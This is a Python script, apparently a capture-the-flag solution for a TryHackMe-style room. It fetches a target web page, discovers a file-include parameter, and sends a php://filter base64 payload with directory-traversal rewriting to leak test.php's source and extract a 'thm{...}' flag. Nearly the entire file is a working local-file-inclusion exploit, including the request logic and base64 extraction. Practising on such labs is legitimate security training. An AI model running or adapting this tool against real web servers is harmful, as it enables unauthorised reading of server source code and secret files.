#!/usr/bin/env python3

import argparse
import base64
import os
import pickle
import platform
import re
import requests

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################
# General Functions
############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def FindParams(targetURL):
    messsage = str()
    paramname = str()
    paramroute = str()
    success = bool()

    try:
        if not(isinstance(targetURL,str)):
            raise TypeError(f"TargetURL must be a string. Got {type(targetURL)}.")

        source, success, message = pull_source(targetURL)
        if not(success):
            raise ValueError(message)

        targetPage = targetURL.split("/")[-1].split("?")[0]

        targetPattern = f"{targetPage}\?.*\"><"

        reg = re.compile(targetPattern)
        matches = reg.findall(source)
        if len(matches) < 1:
            raise ValueError("no params found in source.")

        paramfull = matches[0].split("?")[1]
        paramname = paramfull.split("=")[0]
        paramroute = "/".join(paramfull.split("=")[1].split("/")[:-1])

        message = "parameter and route discovered."
        success = True
    except Exception as ex:
        message = str(ex)
        paramname = ""
        paramroute = ""
        success = False

    return (paramname, paramroute, success, message)

def PHPFilterAttack(targetURL, targetFile, paramname, paramroute):
    content = str()
    message = str()
    success = bool()

    try:
        if not(isinstance(targetURL,str)):
            raise TypeError(f"TargetURL must be a string. Got {type(targetURL)}.")

        if not(isinstance(targetFile,str)):
            raise TypeError(f"TargetFile must be a string. Got {type(targetFile)}.")

        if not(isinstance(paramname,str)):
            raise TypeError(f"Paramname must be a string. Got {type(paramname)}.")

        if not(isinstance(paramroute,str)):
            raise TypeError(f"Paramroute must be a string. Got {type(paramroute)}.")

        if paramroute[-1] == "/":
            paramroute = paramroute[:-1]

        ############################################################
        # Allow for directory traversal
        ############################################################
        while "../.." in targetFile:
            targetFile = targetFile.replace("../..","..//..")

        payload = f"php://filter/convert.base64-encode/resource={paramroute}/{targetFile}"
        params = {paramname : payload}

        resp = requests.get(targetURL, params=params)
        if resp.status_code >= 400:
            raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

        fulltext = resp.text

        b64pat = "[a-zA-Z0-9+/]+={,2}"
        reg = re.compile(b64pat)
        matches = reg.findall(fulltext)

        for match in matches:
            if (len(match) % 4) != 0:
                matches.remove(match)

        for match in matches:
            if len(match) < 4:
                matches.remove(match)

        matches_tmp = list()
        for match in matches:
            try:
                base64.b64decode(match).decode('utf-8')
                matches_tmp.append(match)
            except:
                matches.remove(match)
        
        matches = matches_tmp

        for unwanted in ["HTML", "html","/div"]:
            try:
                matches.remove(unwanted)
            except:
                None

        if len(matches) < 1:
            raise ValueError("no base64 encoded content discovered")

        content = base64.b64decode(matches[0]).decode('utf-8')

        message = "content successfully smuggled out."
        success = True
    except Exception as ex:
        content = ""
        message = str(ex)
        success = False

    return (content, success, message)

def pull_source(baseURL, route=None):
    message = str()
    source = str()
    success = bool()

    try:
        if not(isinstance(baseURL,str)):
            raise TypeError(f"BaseURL must be string. Got {type(baseURL)}.")

        if (len(baseURL) < 1) or (baseURL == "http://") or (baseURL == "https://"):
            raise ValueError("BaseURL is empty.")

        if baseURL[-1] == "/":
            baseURL = baseURL[:-1]

        if (route is None) or not(isinstance(route,str)):
            route = ""

        targetURL = f"{baseURL}/{route}"

        SysMsgNB(f"pulling source for \"{targetURL}\"")
        resp = requests.get(targetURL)
        if resp.status_code >= 400:
            raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

        source = resp.text

        if len(source) < 1:
            raise ValueError("Source is empty.")

        message = "source successfully grabbed"
        success = True
    except Exception as ex:
        message = str(ex)
        source = ""
        success = False

    return (source, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)

    parser.add_argument("-p", "--port", help="Port to connect to target on.", type=port_type, dest="port", default=80)
    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseURL = f"{scheme}://{target}:{port}"

    source, success, message = pull_source(baseURL)
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    flag, success, message = FindFlag(source)
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    paramname, paramroute, success, message = FindParams(f"{baseURL}/test.php")
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    content, success, message = PHPFilterAttack(f"{baseURL}/test.php", "test.php", paramname, paramroute)
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    flag, success, message = FindFlag(content)
    if not(success):
        ErrMsg(message)
    else:
        SucMsg(message)

    return

if __name__ == "__main__":
    main()

